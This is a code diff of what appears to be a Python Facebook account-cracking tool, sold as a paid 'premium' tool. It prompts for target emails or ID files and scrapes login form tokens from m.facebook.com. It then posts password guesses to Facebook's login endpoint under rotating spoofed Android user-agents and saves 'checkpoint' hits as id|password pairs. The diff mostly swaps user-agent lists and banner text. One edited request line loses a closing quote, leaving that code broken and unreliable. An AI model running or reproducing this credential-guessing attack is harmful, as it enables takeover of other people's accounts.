@@ -198,7 +198,7 @@ def pkg_():
   88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
   88 `88. 88   88 88      db   8D 88   88 88  V888 
   88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
+\x1b[1;97m____________________________________________________
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
@@ -206,7 +206,7 @@ def pkg_():
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : PREMIUM
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : PAID
 \033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
-\x1b[1;97m__________________________________________________
+\x1b[1;97m____________________________________________________
 """)
 
         print(f"{II}_{Q}"*50)
@@ -236,7 +236,7 @@ print(f"""
   88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
   88 `88. 88   88 88      db   8D 88   88 88  V888 
   88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
+\x1b[1;97m____________________________________________________
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
@@ -244,7 +244,7 @@ print(f"""
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : PREMIUM
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : PAID
 \033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
-\x1b[1;97m__________________________________________________
+\x1b[1;97m____________________________________________________
 """)
 		
 
@@ -419,7 +419,7 @@ def clon_email():
 
 
 	print(f' {wa} YOUR TARGET EMAIL USER NAME')
-	print(54*f'{II}_')
+	print(50*f'{II}_')
 	Audio_('data/.targetem.mp3')
 	namx = input(f' {wa} TARGET EMAIL NAME : ')
 	
@@ -450,7 +450,7 @@ def clon_email():
 
 
 def crack_filexx():
-	print(54*f'{II}_')
+	print(50*f'{II}_')
 	Audio_('data/.filepath.mp3')
 	file = input(f' {wa} PLEASE SELECT YOUR FILE PATH \n {wa} FILE PATH : ')
 	try:
@@ -612,21 +612,21 @@ def crack(idf,pwx,url,time_xx):
 	
 	
 	
-	uai = random.choice(["Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 7.1.1; OPPO A83t Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/ms_MY;FBAV/325.0.1.4.108;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]",""])
+	uai = random.choice(["Mozilla/5.0 (Linux; Android 10; ZTE 9000 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 11; LM-Q920N Build/RKQ1.210106.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWB32.125-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; itel A571L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 10; AX1078 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/302.0.0.8.113;]","Mozilla/5.0 (Linux; Android 11; i8_ROKR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 11; C5L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]","Mozilla/5.0 (Linux; Android 12; 220733SFG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; BL50 Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]"])
 	
 	
-	uai2 = random.choice(["Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 7.1.1; OPPO A83t Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/ms_MY;FBAV/325.0.1.4.108;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; itel A571L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 10; AX1078 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/302.0.0.8.113;]","Mozilla/5.0 (Linux; Android 11; i8_ROKR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 8.1.0; QS5509A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 11; C5L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]","Mozilla/5.0 (Linux; Android 12; 220733SFG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; BL50 Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 9; BUZZ 2 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/287.0.0.4.117;]","Mozilla/5.0 (Linux; Android 8.1.0; Griffe T8 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 9; Z3351S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/326.0.0.17.97;]","Mozilla/5.0 (Linux; Android 9; U304AA Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/ms_MY;FBAV/340.0.0.9.76;]","Mozilla/5.0 (Linux; Android 11; moto e30 Build/ROPS31.166-72-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/292.0.0.9.109;]","Mozilla/5.0 (Linux; Android 8.1.0; LM-X510WM Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 9; Z6201V Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]"])
+	uai2 = random.choice(["Mozilla/5.0 (Linux; Android 10; ZTE 9000 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 11; LM-Q920N Build/RKQ1.210106.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWB32.125-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; itel A571L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 10; AX1078 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/302.0.0.8.113;]","Mozilla/5.0 (Linux; Android 11; i8_ROKR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 11; C5L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]","Mozilla/5.0 (Linux; Android 12; 220733SFG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; BL50 Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]"])
 	
 	my_color = [II,Q,I,P,H, M, H, K, B, U, O, N]
 	wx = random.choice(my_color)
-	print(f"\r {P}[{wx}N00B B0SS{P}] %s/%s {P}OK:%s "%(loop,len(id),ok),end=" ");sys.stdout.flush()
+	print(f"\r {P}[{wx}R4FSAN-XD{P}] %s/%s {P}OK:%s "%(loop,len(id),ok),end=" ");sys.stdout.flush()
 	for pw in pwx:
 		try:
 			ses.headers.update({"Host": url,"upgrade-insecure-requests":"1","user-agent":f"{uai}","accept":"*/*","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 			get_method = ses.get(f"https://m.facebook.com/").text
 			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
 			head = ({"Host": url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			post_method = ses.post(f"https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=date, headers=head)
+			post_method = ses.post(f"https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101,data=date, headers=head)
 			if "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				data = (f'{idf}|{pw}')
@@ -670,4 +670,4 @@ def crack(idf,pwx,url,time_xx):
 
 	
 if __name__=='__main__':
-	pkg_()
+	manu()
